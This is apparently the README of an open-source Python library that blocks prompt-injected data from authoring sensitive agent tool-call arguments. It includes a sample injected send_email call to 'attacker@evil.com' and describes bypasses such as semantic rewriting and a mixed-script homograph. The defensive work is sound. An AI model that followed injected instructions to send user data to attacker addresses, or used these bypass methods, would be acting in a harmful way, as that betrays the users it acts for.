# Verb-Authority Gate

[![CI](https://github.com/yairsabag/verb-authority/actions/workflows/ci.yml/badge.svg)](https://github.com/yairsabag/verb-authority/actions/workflows/ci.yml)
[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-3776AB.svg)](https://www.python.org/downloads/)
[![License: Apache-2.0](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)

A small Python gate that prevents untrusted agent data from authoring sensitive
tool-call arguments—without classifying prompts.

**Data selects. Never authors.**

> **Exact guarantee:** under the gate's provenance model, untrusted data cannot
> author tool-call arguments whose policy is `trusted_fixed`. The decision is
> enforced before the tool runs; the gate does not try to decide whether a
> prompt is malicious.

This is a research-grade boundary, not a claim that prompt injection is
impossible. The optional ledger catches exact reuse, emails and URLs extracted
from returned text, and several lexical disguises. It does **not** follow a
value through semantic reconstruction—for example, turning “attacker at evil
dot com” into an address. A developer can also defeat the guarantee by marking
untrusted input as trusted without using the ledger. Systems such as CaMeL and
FIDES use interpreter- or planner-level information-flow tracking to cover that
deeper boundary.

## Install

Verb Authority is not published on PyPI. Install the current source directly
from GitHub:

```bash
python -m pip install "verb-authority @ git+https://github.com/yairsabag/verb-authority.git@v0.10.0-beta.6"
python -m verb_authority
```

The second command runs the built-in demo. The package has no runtime
dependencies and keeps the existing `verb_authority.py` module and import API.

The [beta.6 release](https://github.com/yairsabag/verb-authority/releases/tag/v0.10.0-beta.6)
also includes a wheel, source archive, and `SHA256SUMS`. After downloading all
three files, verify them with `sha256sum --check SHA256SUMS` on Linux or
`shasum -a 256 -c SHA256SUMS` on macOS before installing the wheel.

For a local checkout instead:

```bash
git clone https://github.com/yairsabag/verb-authority.git
cd verb-authority
python -m pip install .
```

## 60-second quickstart

The gate accepts a normalized tool call shaped as `{"name": ..., "input":
...}`. Provider-specific tool-call objects should be converted to that small
shape before dispatch.

```python
from verb_authority import Param, Registry, Risk, Tool, build_policy, dispatch

registry = Registry()
registry.add(
    Tool(
        "send_email",
        [Param("to", "email"), Param("body", "string")],
        risk=Risk.WRITE,
    )
)
policy = build_policy(registry)

# The model proposes an attacker-controlled recipient. The only trusted value
# is the recipient the application obtained from a trusted/user-approved flow.
tool_call = {
    "name": "send_email",
    "input": {"to": "attacker@evil.com", "body": "Meeting summary"},
}
decision = dispatch(
    registry,
    policy,
    tool_call,
    trusted_args={"to": "alice@company.com"},
)

print(decision.allow)   # False
print(decision.reason)  # param 'to' is a locked sink; data may not author it
```

Call `dispatch` immediately before tool execution. Execute only when
`decision.allow` is true, and request human approval when
`decision.needs_confirm` is true.

## Scan your tool schemas locally

Export the tool definitions your client already receives, then scan them
without starting a tool server or uploading the schema:

```bash
python -m verb_authority scan tools.json --output authority-report.md
```

The scanner accepts MCP `tools/list` responses, OpenAI function tools, and
Anthropic tool definitions. Its report separates effective risk, an advisory
tool-name heuristic, and author-supplied risk evidence. Tool names are mutable
labels, so a name alone never establishes runtime behavior: without a risk
declaration the effective tier is `unknown`, review is required, and the gate
requires confirmation. Reports also contain per-argument authority, but omit
descriptions, examples, defaults, runtime values, and the input filename. For a
report intended for public sharing, also remove tool and parameter names:

```bash
python -m verb_authority scan tools.json \
  --redact-names --format json --output authority-report.json
```

Use `--fail-on-review` in CI to return a non-zero status when ambiguous risks,
arguments, risk conflicts, or MCP annotation conflicts need attention. Static
inference is a review aid, not a vulnerability verdict; the scanner does not
inspect tool implementations or verify the surrounding application's
authorization and provenance wiring.

### Add implementation-level control evidence

A JSON Schema cannot show that a caller-selected value is constrained by a
runtime allowlist, or that the server supplies an argument which is not exposed
to the model. Add a separate, reviewable declaration when you have that
implementation evidence:

```json
{
  "version": 1,
  "attribution": {
    "name": "security review",
    "source": "implementation and integration tests"
  },
  "tools": {
    "create_export": {
      "risk": {
        "tier": "write",
        "evidence": "attested",
        "effects": ["writes_export_file"]
      },
      "arguments": {
        "destination_path": {
          "authority": "constrained",
          "evidence": "attested",
          "bounds": [
            {
              "source": "approved export root",
              "bounds_mutability": "trusted_party",
              "operational_status": "enforced",
              "enforcement": "runtime path containment"
            }
          ]
        }
      },
      "unexposed_arguments": {
        "tenant_id": {
          "exposure": "server_fixed",
          "enforced_by": "authenticated session",
          "evidence": "observed"
        }
      }
    }
  }
}
```

Pass that file separately from the exported schemas:

```bash
python -m verb_authority scan tools.json \
  --controls controls.json --output authority-report.md
```

Risk declarations require a `tier` (`read_only`, `write`, `financial`,
`destructive`, or `code_exec`), an evidence label, and a non-empty list of
concrete effects. Effects are preserved as author-written evidence and are not
parsed into a verdict. A non-conflicting declaration resolves the `unknown`
fail-safe. If it disagrees with a matched name heuristic, the report preserves
both claims, keeps the effective tier `unknown`, marks the source as
`conflict_safe_default`, and retains confirmation until a human reviews the
conflict. The declaration and its evidence remain visible under
`declared_risk`; they are not relabeled as evidence for the effective
safe-default tier.

Exposed arguments may be `locked`, `constrained`, or `free`. A constrained
argument must name at least one bound and say whether the bound is
`immutable`, controlled by a `trusted_party`, or controlled by the `caller`.
Each bound may also state whether it is running now (`enforced`) or belongs to
a design that is not running (`specified`). If omitted, the report preserves
the absence as `not_stated` rather than assuming the control is active.
Evidence may be `observed`, `declared`, or `attested`. Unexposed arguments
currently support the explicit `server_fixed` control.

These declarations are author-supplied evidence: the scanner validates their
shape, fingerprints them, and displays them alongside (not instead of) its
inferred policy. It does not inspect the enforcement or treat a declaration as
proof. With `--redact-names`, tool and argument names plus attribution are
removed, but author-written bound sources, enforcement text, and notes remain;
review a redacted report before sharing it.

The public [`avp9-nexus` financial fixture](fixtures/README.md) includes a tool
schema, attributed control sidecar, and expected classification used as a
regression oracle.

## Case studies

- [External beta test: when a tool name put confirmation on the wrong
  call](docs/case-studies/external-beta-risk-evidence.md) — a public,
  independently rerun example of under-reporting, over-reporting, and the
  evidence-model redesign that followed.

## Catch authority drift between versions

Compare two exported tool schemas directly. Verb Authority scans both inputs
locally, then reports only authority-relevant changes:

```bash
python -m verb_authority diff tools-main.json tools-pr.json
```

Example output:

```text
[AUTHORITY INCREASE] purchase_bid.destination
  A previously unexposed argument became caller-visible.
  schema_exposure: unexposed -> exposed
```

The command also accepts two non-redacted JSON reports. When implementation
controls are part of the comparison, pass the sidecars with
`--before-controls` and `--after-controls`. Control evidence remains visibly
author-supplied; a diff does not turn a declaration into verified enforcement.

Use the CI threshold to fail only when authority increases. Review-only changes
and protection increases remain visible without failing the job:

```bash
python -m verb_authority diff tools-main.json tools-pr.json \
  --fail-on-increase
```

Or add the repository's zero-configuration composite action after exporting
the baseline and candidate schemas in your workflow:

```yaml
- uses: actions/checkout@v7
- uses: actions/setup-python@v7
  with:
    python-version: "3.12"
- uses: yairsabag/verb-authority@v0.10.0-beta.6
  with:
    before: tools-main.json
    after: tools-pr.json
```

The action fails the step on an authority increase by default. Set
`fail_on_increase: "false"` for an observation-only rollout.

Name-redacted reports cannot be correlated safely across versions, so diff
them locally before applying `--redact-names` to a report intended for sharing.

The [`Tool Authority Atlas`](atlas/README.md) checks in the same analysis for a
small, source-pinned set of public MCP reference tools. It is the seed of a
community corpus, not a ranking of MCP servers.

## What the gate does

The project is one importable module with five cooperating pieces:

- **Per-parameter policies.** Sensitive sinks such as recipients, URLs,
  accounts, paths, and commands default to `trusted_fixed`; bounded values are
  type-checked; free-text bodies are treated as outbound payloads.
- **Safe-by-default inference.** Policies are inferred from the existing tool
  schema. Ambiguous parameters on consequential tools stay locked and appear in
  a one-time review queue.
- **Declared capabilities.** `Param(..., sink=True|False)` lets a tool schema
  resolve overloaded names such as `path` without relying on the heuristic.
- **Declared verb-risk tiers.** Applications declare tools as read-only, write,
  financial, destructive, or code execution. Undeclared tools remain `unknown`
  and require review plus confirmation. A complete-token name heuristic is
  reported only as caller-mutable evidence; it never establishes authority.
- **Optional provenance ledger.** Values returned by tools are recorded as
  untrusted. Exact reuse, contained email/URL extraction, and canonicalized
  lexical variants are forced back to data provenance even if
  `trusted_args` was wired incorrectly.

The gate rejects unknown tools and unknown arguments. It does not replace your
tool schema's required-field validation or the tool implementation's own
authorization checks.

## Integrating a tool loop

`trusted_args` is an application provenance declaration: an argument is marked
trusted only when it equals the corresponding application-supplied value.
Everything else is data.

```python
from verb_authority import Param, ProvenanceLedger, Registry, Risk, Tool
from verb_authority import build_policy, dispatch

registry = Registry()
registry.add(
    Tool(
        "send_email",
        [Param("to", "email"), Param("subject"), Param("body")],
        risk=Risk.WRITE,
    )
)
policy = build_policy(registry)
ledger = ProvenanceLedger()

# After normalizing the model/provider tool call:
decision = dispatch(
    registry,
    policy,
    tool_call,
    trusted_args={"to": user_confirmed_email},
    ledger=ledger,
)
if not decision.allow:
    return {"error": decision.reason}
if decision.needs_confirm and not ask_user(decision.reason):
    return {"error": "user denied"}

result = run_tool(tool_call)
ledger.record_result(result)
```

Thread one ledger through the session and record each result immediately after
the tool returns. The ledger is a containment layer, not sound taint tracking:
it recognizes values and selected lexical forms, not arbitrary transformations
or control flow.

## Evidence and demos

The complete pytest suite covers policy inference, declared capabilities, verb
risk, the gate, dispatch, ledger containment, canonicalization, schema import,
report redaction, and the reproducible Atlas baseline:

```bash
python -m pytest -v
```

Additional executable evaluations are intentionally kept as small scripts:

```bash
python validate_v01.py   # 11 schemas / 31 parameters; 0 silent-unsafe outcomes
python chain_demo.py     # laundering without vs. with the ledger
python adversarial.py    # known successes and failures by attack family
python adaptive.py       # adaptive resistance depth and first observed break
python capability_demo.py
```

The adaptive evaluation found a mixed-script homograph bypass in the earlier
implementation. Canonicalization raised the observed break point from tier 2
to tier 5 in the included attacker; the current break is semantic rewrite.
That result describes this test arsenal, not a universal security score.

`agent_demo.py` and `resolve_live.py` are optional Anthropic-backed demos and
require `ANTHROPIC_API_KEY`. The core module, tests, and offline evaluations do
not require an API key.

## Security boundary and known limitations

This project deliberately publishes its failure modes:

- **Provenance must be real.** Without a ledger, `trusted_args` is only as
  trustworthy as the application code that supplies it. Data mislabeled as
  trusted can reach a locked sink.
- **Semantic rewrites are not tracked.** The ledger matches exact values,
  contained risk-shaped strings, and canonicalized lexical variants. It cannot
  track a value the model interprets and reconstructs.
- **Integrity, not confidentiality.** The gate controls whether untrusted data
  can author sensitive arguments. It does not track secrets or stop private
  data from leaving through an otherwise authorized channel.
- **Tool calls, not model output.** Text returned to a human is not audited, so
  untrusted content can still social-engineer the user through the agent's
  reply.
- **Heuristics need review.** Undeclared parameter policies are inferred from
  names and types. Tool-name risk is only a caller-mutable review signal;
  undeclared tools stay `unknown`. Review both `PolicySet.review` and
  `PolicySet.risk_review`, declare tool risk and overloaded sink capabilities,
  and keep the registry accurate.
- **Application controls still apply.** Required arguments, authentication,
  authorization, rate limits, sandboxing, and human confirmation must still be
  enforced by the surrounding system.

Run `python adversarial.py` to see the known gaps exercised rather than hidden.
Please report new bypasses with the repository's focused issue template; keep
sensitive deployment details out of public issues and follow
[`SECURITY.md`](SECURITY.md).

## Related work and positioning

Verb Authority is a minimal, drop-in experiment inspired by Google DeepMind's
**CaMeL** (“Defeating Prompt Injections by Design,” arXiv:2503.18813,
Apache-2.0). It trades CaMeL's interpreter-level soundness for adoption in an
existing tool loop.

The closest structural approaches make different tradeoffs:

- **CaMeL** tracks taint through a custom interpreter.
- **FIDES** tracks integrity and confidentiality through a dedicated planner.
- **Progent** enforces a policy over tool calls; it is complementary to this
  project's value-provenance question.
- **NeuroTaint** performs semantic taint analysis offline rather than blocking
  calls at runtime.
- Detector-based guardrails classify content or intent and can be layered with
  this approach, but they provide a different kind of control.

[`LANDSCAPE.md`](LANDSCAPE.md) contains the detailed field map, citations, and
the places where this project does less than the research systems. If you need
sound transformation tracking or confidentiality enforcement, choose one of
those deeper systems rather than this module.

## Project status

v0.9.0 is the latest stable release. v0.10.0-beta.6 is the public beta for the
local schema scanner, control evidence, Authority Diff, and Tool Authority
Atlas. This remains early, research-grade work and is not described as
production-ready. See
[`CHANGELOG.md`](CHANGELOG.md) for release notes and
[`CONTRIBUTING.md`](CONTRIBUTING.md) for focused contribution guidance.

Licensed under Apache-2.0.
